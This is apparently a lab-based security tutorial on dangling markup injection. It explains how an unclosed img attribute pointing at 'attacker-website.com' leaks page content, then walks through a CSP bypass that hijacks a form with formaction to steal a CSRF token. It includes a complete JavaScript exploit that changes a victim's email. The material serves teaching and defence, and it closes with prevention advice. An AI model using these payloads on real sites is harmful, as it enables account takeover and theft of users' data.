# 1. Dangling Markup Injection

## What is dangling markup injection?

Dangling markup injection is a way to steal data across domains when a *full* XSS attack isn't possible (e.g. it's blocked by input filters or a Content Security Policy).

**The setup:** imagine an app puts attacker-controlled input straight into a page without properly escaping it:

```html
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```

If the app doesn't filter out `>` or `"`, an attacker can break out of the attribute and the tag:

```html
">
```

Normally, an attacker would try to escalate this into full XSS. But if that's blocked, they can instead leave a tag "dangling" — deliberately unfinished:

```html
"><img src='//attacker-website.com?
```

Here's the trick: this opens an `<img>` tag with a `src` attribute pointing to the attacker's server — but never closes the quote. The browser doesn't know that, though. It just keeps reading forward through the page, treating *everything* it finds until the next `'` character as part of that URL. So all the surrounding page content — sensitive data, tokens, whatever comes next — gets swept up into the URL and sent off to the attacker's server. Any special characters like newlines get automatically URL-encoded along the way.

The result: an attacker can capture a chunk of the page's response after their injection point — potentially including things like CSRF tokens, private messages, or financial info. This works with any HTML attribute that causes an external request, not just `img src`.

## Example lab: bypassing a strict CSP with dangling markup

Some labs make this harder by using a CSP that blocks the page from loading any external resources — so a plain `<img src=attacker.com>` trick won't even fire. Here's a simplified walk-through of one such attack, which instead **hijacks a form** so the victim submits their own CSRF token to the attacker.

**Goal:** trick a logged-in victim into unknowingly sending their CSRF token to the attacker, then use that token to change their email.

**Step-by-step:**

1. **Find the injection point.** Trying an obvious XSS payload like `` `<img src onerror=alert(1)>` `` gets blocked by client-side validation on the email field.

2. **Bypass the client-side check.** Using browser DevTools, the input type can be switched from `email` to `text`, revealing the real HTML — including a hidden CSRF token field powering the email-change form.

3. **Sneak the payload past validation** by disguising it as a "valid" email:
   ```
   foo@example.com"><img src= onerror=alert(1)>
   ```
   It gets reflected back on the page, but properly escaped — so no script runs. This tells us the server does sanitize input, and CSP is likely also in play.

4. **Confirm CSP is blocking things** by trying the payload via a URL parameter instead:
   ```
   https://YOUR-LAB-ID.web-security-academy.net/my-account?email=<img src onerror=alert(1)>
   ```
   It's reflected, but doesn't run — and the browser console shows a CSP violation message confirming the block.

5. **Look for a CSP gap.** Many CSPs forget to restrict `form-action`, which controls where forms are allowed to submit to. This becomes the way in.

6. **Inject a fake button** using the email parameter, pointing its `formaction` at an attacker-controlled server:
   ```
   https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-server.net/exploit">Click me</button>
   ```
   Clicking it hijacks the real form and submits it to the attacker's server instead — proving the CSP's `form-action` gap is exploitable.

7. **Grab the CSRF token.** Since the form normally submits via `POST`, the token isn't visible in the URL. Adding `formmethod="get"` forces the hijacked submission to use `GET` instead — which puts the CSRF token right in the URL, where the attacker's server can see it:
   ```
   https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-server.net/exploit" formmethod="get">Click me</button>
   ```

8. **Automate the full attack.** The final exploit script does two things depending on the situation:
   - If a CSRF token is already present in the URL (captured from the previous step), it silently builds and submits a hidden form to change the victim's email to `hacker@evil-user.net`, using that stolen token.
   - If no token is present yet, it redirects the victim to the crafted URL containing the malicious button — setting up the token theft.

   ```javascript
   const academyFrontend = "https://your-lab-url.net/";
   const exploitServer = "https://your-exploit-server.net/exploit";

   const url = new URL(location);
   const csrf = url.searchParams.get('csrf');

   if (csrf) {
       // Token captured — silently submit the email-change form using it
       const form = document.createElement('form');
       const email = document.createElement('input');
       const token = document.createElement('input');

       token.name = 'csrf';
       token.value = csrf;

       email.name = 'email';
       email.value = 'hacker@evil-user.net';

       form.method = 'post';
       form.action = `${academyFrontend}my-account/change-email`;
       form.append(email);
       form.append(token);
       document.documentElement.append(form);
       form.submit();

   } else {
       // No token yet — redirect to the page with the hijacked button to steal it
       location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
   }
   ```

9. Deliver this to the victim. Once they interact with the page (per the lab, the click needs to be induced with wording like "Click me"), their email silently gets changed to the attacker's address — all without a single script ever executing, since the CSP never actually got broken.

## How to prevent dangling markup attacks

- **Same defenses as XSS:** properly encode data before it goes into a response, and validate/sanitize input as it comes in.
- **Use CSP as a backstop** — a policy that blocks tags like `<img>` from loading external resources can stop *some* dangling markup attacks (though not all, as the form-hijacking example shows).
- **Browser-level mitigation:** Chrome now blocks `<img>` (and similar tags) from including raw special characters — like angle brackets or newlines — inside URLs. Since dangling markup attacks rely on capturing exactly that kind of raw content, this closes off a lot of these attacks by default.
